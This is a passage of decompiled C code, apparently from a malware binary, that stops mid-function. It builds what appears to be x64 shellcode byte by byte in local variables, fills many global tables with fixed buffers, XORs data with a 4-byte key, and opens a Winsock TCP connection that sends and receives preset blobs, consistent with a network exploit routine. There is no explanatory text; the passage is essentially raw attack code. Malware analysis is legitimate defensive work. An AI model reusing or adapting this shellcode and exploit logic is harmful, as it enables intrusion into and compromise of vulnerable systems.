  local_70 = 0xc1;
  local_6f = 0x48;
  local_6e = 0x31;
  local_6d = 0xc0;
  local_6c = 0xb9;
  local_6b = 0;
  local_6a = 4;
  local_69 = 0;
  local_68 = 0;
  local_67 = 0x4c;
  local_66 = 0x89;
  local_65 = 0xcf;
  local_64 = 0xf3;
  local_63 = 0xab;
  local_62 = 0x4c;
  local_61 = 0x89;
  local_60 = 0xcf;
  local_5f = 0x48;
  local_5e = 0x83;
  local_5d = 199;
  local_5c = 0x60;
  local_5b = 0x48;
  local_5a = 0x8d;
  local_59 = 0x35;
  local_58 = 0x91;
  local_57 = 2;
  local_56 = 0;
  local_55 = 0;
  local_54 = 0x48;
  local_53 = 0x31;
  local_52 = 0xc9;
  local_51 = 0x66;
  local_50 = 0xb9;
  local_4f = 0x36;
  local_4e = 2;
  local_4d = 0xf3;
  local_4c = 0xa4;
  local_4b = 0x4d;
  local_4a = 0x89;
  local_49 = 9;
  local_48 = 0x48;
  local_47 = 0x8b;
  local_46 = 0x5d;
  local_45 = 0xf8;
  local_44 = 0x49;
  local_43 = 0x89;
  local_42 = 0x59;
  local_41 = 8;
  local_40 = 0x48;
  local_3f = 0x31;
  local_38 = 0x89;
  local_2d = 0x89;
  local_22 = 0x89;
  local_1b = 0x89;
  local_b = 0x89;
  local_3d = 0x48;
  local_35 = 0x48;
  local_32 = 0x48;
  local_2a = 0x48;
  local_27 = 0x48;
  local_1f = 0x48;
  local_18 = 0x48;
  local_14 = 0x48;
  local_9 = 0x48;
  iVar1 = 0x163;
  local_3e = 0xdf;
  local_3c = 0x8b;
  local_3b = 0x5d;
  local_3a = 0xf0;
  local_39 = 0x49;
  local_37 = 0x59;
  local_36 = 0x10;
  local_34 = 0x31;
  local_33 = 0xdf;
  local_31 = 0x8b;
  local_30 = 0x5d;
  local_2f = 0xe8;
  local_2e = 0x49;
  local_2c = 0x59;
  local_2b = 0x18;
  local_29 = 0x31;
  local_28 = 0xdf;
  local_26 = 0x8b;
  local_25 = 0x5d;
  local_24 = 0xe0;
  local_23 = 0x49;
  local_21 = 0x59;
  local_20 = 0x20;
  local_1e = 0x31;
  local_1d = 0xdf;
  local_1c = 0x41;
  local_1a = 0x79;
  local_19 = 0x44;
  local_17 = 0x8b;
  local_16 = 0x45;
  local_15 = 0xe0;
  local_13 = 0x83;
  local_12 = 0xc0;
  local_11 = 0x70;
  local_10 = 0x49;
  local_f = 0x83;
  local_e = 0xc1;
  local_d = 0x60;
  local_c = 0x4c;
  local_a = 8;
  _DAT_00559670 = 0x58c;
  puVar2 = (undefined4 *)&local_594;
  puVar3 = &DAT_00559674;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_0055bd88 = 0xe0000000;
  _DAT_0055bd8c = 0x3f3290d9;
  _DAT_0055bd90 = 0;
  _DAT_0055bd94 = 9;
  _DAT_0055bd98 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0055bd9c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_0055e4b0 = 0xb8000000;
  _DAT_0055e4b4 = 0x3f3d8441;
  _DAT_0055e4b8 = 0;
  _DAT_0055e4bc = 9;
  _DAT_0055e4c0 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_0055e4c4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_00560bd8 = 0xcb000000;
  _DAT_00560bdc = 0x3f700c16;
  _DAT_00560be0 = 0;
  iVar1 = 0x16d;
  _DAT_00560be4 = 10;
  _DAT_00560be8 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_00560bec;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00563300 = 0x90000000;
  _DAT_00563304 = 0x3f218687;
  _DAT_00563308 = 0;
  _DAT_0056330c = 10;
  _DAT_00563310 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_00563314;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x177;
  _DAT_00565a28 = 0x50000000;
  _DAT_00565a2c = 0x3f3d2cfb;
  _DAT_00565a30 = 0;
  _DAT_00565a34 = 0xb;
  _DAT_00565a38 = 0x5dc;
  puVar2 = &DAT_0042c7a8;
  puVar3 = &DAT_00565a3c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x163;
  _DAT_00568150 = 0x20000000;
  _DAT_00568154 = 0x3f19a8d1;
  _DAT_00568158 = 0;
  _DAT_0056815c = 0xb;
  _DAT_00568160 = 0x58c;
  puVar2 = (undefined4 *)&local_594;
  puVar3 = &DAT_00568164;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_0056a878 = 0x10000000;
  _DAT_0056a87c = 0x3f16650b;
  _DAT_0056a880 = 0;
  _DAT_0056a884 = 0xc;
  _DAT_0056a888 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0056a88c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_0056cfa0 = 0x4000000;
  _DAT_0056cfa4 = 0x3f39f7df;
  _DAT_0056cfa8 = 0;
  _DAT_0056cfac = 0xc;
  _DAT_0056cfb0 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_0056cfb4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_0056f6c8 = 0x90000000;
  _DAT_0056f6cc = 0x3f196c26;
  _DAT_0056f6d0 = 0;
  _DAT_0056f6d4 = 0xd;
  _DAT_0056f6d8 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0056f6dc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00571df0 = 0x2f000000;
  _DAT_00571df4 = 0x3f512473;
  _DAT_00571df8 = 0;
  _DAT_00571dfc = 0xd;
  _DAT_00571e00 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_00571e04;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00574518 = 0xc1800000;
  _DAT_0057451c = 0x3f6e86bd;
  _DAT_00574520 = 0;
  _DAT_00574524 = 0xe;
  _DAT_00574528 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0057452c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_00576c40 = 0x88000000;
  _DAT_00576c44 = 0x3f21b499;
  _DAT_00576c48 = 0;
  iVar1 = 0x16d;
  _DAT_00576c4c = 0xe;
  _DAT_00576c50 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_00576c54;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00579368 = 0x10000000;
  _DAT_0057936c = 0x3f3ad20f;
  _DAT_00579370 = 0;
  _DAT_00579374 = 0xf;
  _DAT_00579378 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0057937c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_0057ba90 = 0x68000000;
  _DAT_0057ba94 = 0x3f3a8f4d;
  _DAT_0057ba98 = 0;
  _DAT_0057ba9c = 0xf;
  _DAT_0057baa0 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_0057baa4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x177;
  _DAT_0057e1b8 = 0x20000000;
  _DAT_0057e1bc = 0x3f147956;
  _DAT_0057e1c0 = 0;
  _DAT_0057e1c4 = 0x11;
  _DAT_0057e1c8 = 0x5dc;
  puVar2 = &DAT_0042c7a8;
  puVar3 = &DAT_0057e1cc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x163;
  _DAT_005808e0 = 0xe0000000;
  _DAT_005808e4 = 0x3f0dd89c;
  _DAT_005808e8 = 0;
  _DAT_005808ec = 0x11;
  _DAT_005808f0 = 0x58c;
  puVar2 = (undefined4 *)&local_594;
  puVar3 = &DAT_005808f4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x177;
  _DAT_00583008 = 0xe8000000;
  _DAT_0058300c = 0x3f446e49;
  _DAT_00583010 = 0;
  _DAT_00583014 = 0x12;
  _DAT_00583018 = 0x5dc;
  puVar2 = &DAT_0042c7a8;
  puVar3 = &DAT_0058301c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x163;
  _DAT_00585730 = 0xf0000000;
  _DAT_00585734 = 0x3f12d0ab;
  _DAT_00585738 = 0;
  _DAT_0058573c = 0x12;
  _DAT_00585740 = 0x58c;
  puVar2 = (undefined4 *)&local_594;
  puVar3 = &DAT_00585744;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x177;
  _DAT_00587e58 = 0x30000000;
  _DAT_00587e5c = 0x3f2e42b6;
  _DAT_00587e60 = 0;
  _DAT_00587e64 = 0x13;
  _DAT_00587e68 = 0x5dc;
  puVar2 = &DAT_0042c7a8;
  puVar3 = &DAT_00587e6c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x163;
  _DAT_0058a580 = 0xf4000000;
  _DAT_0058a584 = 0x3f3349ef;
  _DAT_0058a588 = 0;
  _DAT_0058a58c = 0x13;
  _DAT_0058a590 = 0x58c;
  puVar2 = (undefined4 *)&local_594;
  puVar3 = &DAT_0058a594;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_0058cca8 = 0xd4000000;
  _DAT_0058ccac = 0x3f398127;
  _DAT_0058ccb0 = 0;
  iVar1 = 0x16d;
  _DAT_0058ccb4 = 0x14;
  _DAT_0058ccb8 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_0058ccbc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_0058f3d0 = 0xa8000000;
  _DAT_0058f3d4 = 0x3f4fd1e8;
  _DAT_0058f3d8 = 0;
  _DAT_0058f3dc = 0x14;
  _DAT_0058f3e0 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_0058f3e4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00591af8 = 0x50000000;
  _DAT_00591afc = 0x3f168835;
  _DAT_00591b00 = 0;
  _DAT_00591b04 = 0x15;
  _DAT_00591b08 = 0x5b4;
  puVar2 = &DAT_0042bc40;
  puVar3 = &DAT_00591b0c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x16d;
  _DAT_00594220 = 0xb4000000;
  _DAT_00594224 = 0x3f3875e0;
  _DAT_00594228 = 0;
  _DAT_0059422c = 0x15;
  _DAT_00594230 = 0x5b4;
  puVar2 = &DAT_0042c1f4;
  puVar3 = &DAT_00594234;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_00596948 = 0x7c000000;
  _DAT_0059694c = 0x3f315570;
  _DAT_00596950 = 0;
  _DAT_00596954 = 3;
  _DAT_00596958 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_0059695c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_00599070 = 0xf2000000;
  _DAT_00599074 = 0x3f448355;
  _DAT_00599078 = 0;
  _DAT_0059907c = 4;
  _DAT_00599080 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_00599084;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_0059b798 = 0x70000000;
  _DAT_0059b79c = 0x3f14b464;
  _DAT_0059b7a0 = 0;
  _DAT_0059b7a4 = 5;
  _DAT_0059b7a8 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_0059b7ac;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_0059dec0 = 0x2d800000;
  _DAT_0059dec4 = 0x3f6e24d2;
  _DAT_0059dec8 = 0;
  _DAT_0059decc = 6;
  _DAT_0059ded0 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_0059ded4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_005a05e8 = 0x9c000000;
  _DAT_005a05ec = 0x3f3a3e9a;
  _DAT_005a05f0 = 0;
  _DAT_005a05f4 = 7;
  _DAT_005a05f8 = 0x480;
  iVar1 = 0x120;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005a05fc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005a2d10 = 0xfa000000;
  _DAT_005a2d14 = 0x3f446a89;
  _DAT_005a2d18 = 0;
  _DAT_005a2d1c = 8;
  _DAT_005a2d20 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005a2d24;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005a5438 = 0xb4000000;
  _DAT_005a543c = 0x3f3940ee;
  _DAT_005a5440 = 0;
  _DAT_005a5444 = 9;
  _DAT_005a5448 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005a544c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005a7b60 = 0xd0000000;
  _DAT_005a7b64 = 0x3f16ac94;
  _DAT_005a7b68 = 0;
  _DAT_005a7b6c = 10;
  _DAT_005a7b70 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005a7b74;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005aa288 = 0xd4000000;
  _DAT_005aa28c = 0x3f393a74;
  _DAT_005aa290 = 0;
  _DAT_005aa294 = 0xb;
  _DAT_005aa298 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005aa29c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005ac9b0 = 0xa0000000;
  _DAT_005ac9b4 = 0x3f0c14b3;
  _DAT_005ac9b8 = 0;
  _DAT_005ac9bc = 0xc;
  _DAT_005ac9c0 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005ac9c4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005af0d8 = 0x10000000;
  _DAT_005af0dc = 0x3f202237;
  _DAT_005af0e0 = 0;
  _DAT_005af0e4 = 0xd;
  _DAT_005af0e8 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005af0ec;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005b1800 = 0xe1800000;
  _DAT_005b1804 = 0x3f673c0f;
  _DAT_005b1808 = 0;
  _DAT_005b180c = 0xe;
  _DAT_005b1810 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005b1814;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005b3f28 = 0x2e000000;
  _DAT_005b3f2c = 0x3f40e4f9;
  _DAT_005b3f30 = 0;
  _DAT_005b3f34 = 0xf;
  _DAT_005b3f38 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005b3f3c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_005b6650 = 0;
  _DAT_005b6654 = 0x3f1742a3;
  _DAT_005b6658 = 0;
  _DAT_005b665c = 0x11;
  _DAT_005b6660 = 0x480;
  iVar1 = 0x120;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005b6664;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005b8d78 = 0;
  _DAT_005b8d7c = 0x3f07de43;
  _DAT_005b8d80 = 0;
  _DAT_005b8d84 = 0x12;
  _DAT_005b8d88 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005b8d8c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005bb4a0 = 0x28000000;
  _DAT_005bb4a4 = 0x3f2f0189;
  _DAT_005bb4a8 = 0;
  _DAT_005bb4ac = 0x13;
  _DAT_005bb4b0 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005bb4b4;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005bdbc8 = 0x70000000;
  _DAT_005bdbcc = 0x3f34b109;
  _DAT_005bdbd0 = 0;
  _DAT_005bdbd4 = 0x14;
  _DAT_005bdbd8 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005bdbdc;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  iVar1 = 0x120;
  _DAT_005c02f0 = 0x74000000;
  _DAT_005c02f4 = 0x3f4ab21d;
  _DAT_005c02f8 = 0;
  _DAT_005c02fc = 0x15;
  _DAT_005c0300 = 0x480;
  puVar2 = &DAT_0042de28;
  puVar3 = &DAT_005c0304;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  _DAT_005c2a18 = 0xa4000000;
  _DAT_005c2a1c = 0x3f40f76d;
  _DAT_005c2a20 = 3;
  _DAT_005c2a24 = 3;
  _DAT_005c5140 = 0xea16800;
  _DAT_005c5144 = 0x4023ef72;
  _DAT_005c5148 = 3;
  _DAT_005c514c = 4;
  _DAT_005c7868 = 0x8000000;
  _DAT_005c786c = 0x3f20c1b3;
  _DAT_005c7870 = 3;
  _DAT_005c7874 = 5;
  _DAT_005c9f90 = 0x1d000000;
  _DAT_005c9f94 = 0x3f565f79;
  _DAT_005c9f98 = 3;
  _DAT_005c9f9c = 6;
  _DAT_005cc6b8 = 0;
  _DAT_005cc6bc = 0x3f11a931;
  _DAT_005cc6c0 = 3;
  _DAT_005cc6c4 = 7;
  _DAT_005cede0 = 0;
  _DAT_005cede4 = 0x3f1216ea;
  _DAT_005cede8 = 3;
  _DAT_005cedec = 8;
  _DAT_005d1508 = 0x4a000000;
  _DAT_005d150c = 0x3f72d7f5;
  _DAT_005d1510 = 3;
  _DAT_005d1514 = 9;
  _DAT_005d3c30 = 0xe0000000;
  _DAT_005d3c34 = 0x3f0b5bbf;
  _DAT_005d3c38 = 3;
  _DAT_005d3c3c = 10;
  _DAT_005d6358 = 0x20000000;
  _DAT_005d635c = 0x3f0d5627;
  _DAT_005d6360 = 3;
  _DAT_005d6364 = 0xb;
  _DAT_005d8a80 = 0;
  _DAT_005d8a84 = 0x3f0f98c4;
  _DAT_005d8a88 = 3;
  _DAT_005d8a8c = 0xc;
  _DAT_005db1a8 = 0xc0000000;
  _DAT_005db1ac = 0x3f008019;
  _DAT_005db1b0 = 3;
  _DAT_005db1b4 = 0xd;
  iVar1 = 0x14;
  _DAT_005dd8d0 = 0x80000000;
  _DAT_005dd8d4 = 0x3f02cd2e;
  _DAT_005dd8d8 = 3;
  _DAT_005dd8dc = 0xe;
  _DAT_005dfff8 = 0x80000000;
  _DAT_005dfffc = 0x3efe0e2a;
  _DAT_005e0000 = 3;
  _DAT_005e0004 = 0xf;
  _DAT_005e2720 = 0x80000000;
  _DAT_005e2724 = 0x3eff8be1;
  _DAT_005e2728 = 3;
  _DAT_005e272c = 0x11;
  _DAT_005e4e48 = 0x8bc00000;
  _DAT_005e4e4c = 0x3f760747;
  _DAT_005e4e50 = 0;
  _DAT_005e4e54 = 1;
  _DAT_005e4e58 = 0x7c;
  puVar2 = &DAT_0042e2a8;
  puVar3 = &DAT_005e4e5c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x14;
  _DAT_005e7570 = 0x7e680000;
  _DAT_005e7574 = 0x3fbf1459;
  _DAT_005e7578 = 1;
  _DAT_005e757c = 1;
  _DAT_005e9c98 = 0x65200000;
  _DAT_005e9c9c = 0x3f88dd14;
  _DAT_005e9ca0 = 0;
  _DAT_005e9ca4 = 1;
  _DAT_005e9ca8 = 0x51;
  puVar2 = &DAT_0042e324;
  puVar3 = &DAT_005e9cac;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  iVar1 = 0x15;
  _DAT_005ec3c0 = 0x20000000;
  _DAT_005ec3c4 = 0x3f12bc9b;
  _DAT_005ec3c8 = 3;
  _DAT_005ec3cc = 0x12;
  _DAT_005eeae8 = 0xc0000000;
  _DAT_005eeaec = 0x3f0c1abd;
  _DAT_005eeaf0 = 3;
  _DAT_005eeaf4 = 0x13;
  _DAT_005f1210 = 0xc0000000;
  _DAT_005f1214 = 0x3ef76f43;
  _DAT_005f1218 = 3;
  _DAT_005f121c = 0x14;
  _DAT_005f3938 = 0x80000000;
  _DAT_005f393c = 0x3f045e39;
  _DAT_005f3940 = 3;
  _DAT_005f3944 = 0x15;
  _DAT_005f6060 = 0x40000000;
  _DAT_005f6064 = 0x3ef6ad2f;
  _DAT_005f6068 = 1;
  _DAT_005f606c = 1;
  _DAT_005f8788 = 0x65200000;
  _DAT_005f878c = 0x3f88dd14;
  _DAT_005f8790 = 0;
  _DAT_005f8794 = 1;
  _DAT_005f8798 = 0x55;
  puVar2 = &DAT_0042e378;
  puVar3 = &DAT_005f879c;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *(undefined *)puVar3 = *(undefined *)puVar2;
  _DAT_005faeb0 = 0xac00000;
  _DAT_005faeb4 = 0x3f837956;
  _DAT_005faeb8 = 1;
  _DAT_005faebc = 1;
  _DAT_005fd5d8 = 0x3c800000;
  _DAT_005fd5dc = 0x3f8441dd;
  _DAT_005fd5e0 = 3;
  _DAT_005fd5e4 = 1;
  _DAT_005ffd00 = 0xa7200000;
  _DAT_005ffd04 = 0x3f855ec8;
  return;
}

undefined4 __cdecl FUN_00406eb0(undefined4 param_1,int param_2) {
  if (param_2 == 0) {
    return 1;
  }
  return 0;
}

uint __cdecl FUN_00406ed0(uint param_1) {
  return ((param_1 & 0xff00 | param_1 << 0x10) << 8 | (param_1 & 0xff0000 | param_1 >> 0x10) >> 8) ^
         param_1 * 2;
}

undefined4 __cdecl FUN_00406f00(undefined4 param_1,int param_2,int param_3) {
  uint uVar1;
  uint uVar2;
  undefined4 uStack8;
  undefined uStack4;
  
  uVar1 = 0;
  uStack4 = 0;
  uStack8 = param_1;
  if (param_3 < 1) {
    return 0;
  }
  do {
    uVar2 = uVar1 & 0x80000003;
    if ((int)uVar2 < 0) {
      uVar2 = (uVar2 - 1 | 0xfffffffc) + 1;
    }
    *(byte *)(uVar1 + param_2) = *(byte *)(uVar1 + param_2) ^ *(byte *)((int)&uStack8 + uVar2);
    uVar1 = uVar1 + 1;
  } while ((int)uVar1 < param_3);
  return 0;
}
/*
Unable to decompile 'FUN_00406f50'
Cause: 
Low-level Error: Cannot properly adjust input varnodes
*/
// WARNING: Could not reconcile some variable overlaps

undefined4 __cdecl FUN_004072a0(undefined4 param_1,undefined4 param_2) {
  undefined uVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 uStack1068;
  undefined4 local_418;
  uint uStack1038;
  int iStack1034;
  undefined uStack1028;
  undefined uStack1027;
  undefined local_400;
  undefined4 local_3ff;
  undefined4 uStack24;
  
  iVar5 = 0xff;
  local_400 = 0;
  local_418 = CONCAT22(local_418._2_2_,2);
  puVar6 = (undefined4 *)&local_3ff;
  while (iVar5 != 0) {
    iVar5 = iVar5 + -1;
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = 0;
  *(undefined *)((int)puVar6 + 2) = 0;
  uStack1068 = param_1;
  local_418 = Ordinal_11();
  Ordinal_9(param_2);
  iVar5 = Ordinal_23(2,1,0);
  if (iVar5 != -1) {
    iVar2 = Ordinal_4(iVar5,&uStack1068,0x10);
    if (iVar2 != -1) {
      iVar2 = Ordinal_19(iVar5,&DAT_0042e544,0x89,0);
      if (iVar2 != -1) {
        iVar2 = Ordinal_16(iVar5,&stack0xfffffbe0,0x400,0);
        if (iVar2 != -1) {
          iVar2 = Ordinal_19(iVar5,&DAT_0042e5d0,0x8c,0);
          if (iVar2 != -1) {
            iVar2 = Ordinal_16(iVar5,&stack0xfffffbe0,0x400,0);
            uVar1 = local_400;
            if (iVar2 != -1) {
              DAT_0042e67c = local_400;
